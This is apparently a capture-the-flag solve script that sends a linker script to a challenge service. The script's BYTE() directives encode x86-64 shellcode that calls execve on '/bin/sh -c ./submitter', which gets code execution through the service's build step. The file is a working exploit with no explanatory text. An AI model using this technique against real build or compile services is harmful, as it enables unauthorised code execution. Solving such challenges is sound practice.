import os
import time
from ptrlib import *

HOST = os.getenv('HOST', 'localhost')
PORT = 31337 #os.getenv('PORT', 31337)

#sock = Process("./challenge", cwd="handout")
sock = Socket(HOST, PORT)
stream = sock

time.sleep(1)

sock.sendline("""OUTPUT_FORMAT("elf64-x86-64", "elf64-x86-64", "elf64-x86-64")
OUTPUT_ARCH(i386:x86-64)
ENTRY(_start)
SECTIONS
{
  . = 0x400000 + SIZEOF_HEADERS;
  .text : {
    _start = .;
    BYTE(0x31);
    BYTE(0xd2);
    BYTE(0x52);
    BYTE(0x48);
    BYTE(0x8d);
    BYTE(0x3d);
    BYTE(0x26);
    BYTE(0x00);
    BYTE(0x00);
    BYTE(0x00);
    BYTE(0x57);
    BYTE(0x48);
    BYTE(0x8d);
    BYTE(0x3d);
    BYTE(0x1b);
    BYTE(0x00);
    BYTE(0x00);
    BYTE(0x00);
    BYTE(0x57);
    BYTE(0x48);
    BYTE(0x8d);
    BYTE(0x3d);
    BYTE(0x0b);
    BYTE(0x00);
    BYTE(0x00);
    BYTE(0x00);
    BYTE(0x57);
    BYTE(0x48);
    BYTE(0x89);
    BYTE(0xe6);
    BYTE(0xb8);
    BYTE(0x3b);
    BYTE(0x00);
    BYTE(0x00);
    BYTE(0x00);
    BYTE(0x0f);
    BYTE(0x05);
    BYTE(0x2f);
    BYTE(0x62);
    BYTE(0x69);
    BYTE(0x6e);
    BYTE(0x2f);
    BYTE(0x73);
    BYTE(0x68);
    BYTE(0x00);
    BYTE(0x2d);
    BYTE(0x63);
    BYTE(0x00);
    BYTE(0x2e);
    BYTE(0x2f);
    BYTE(0x73);
    BYTE(0x75);
    BYTE(0x62);
    BYTE(0x6d);
    BYTE(0x69);
    BYTE(0x74);
    BYTE(0x74);
    BYTE(0x65);
    BYTE(0x72);
    BYTE(0x00);
  }
}""")
sock.sendline("")

time.sleep(1)
sock.recvuntil("Built target main")
print(sock.recvline().decode())
print(sock.recvline().decode())

"""
while True:
    try:
        print(sock.recvline(timeout=1).decode())
    except TimeoutError:
        break
#"""

sock.close()
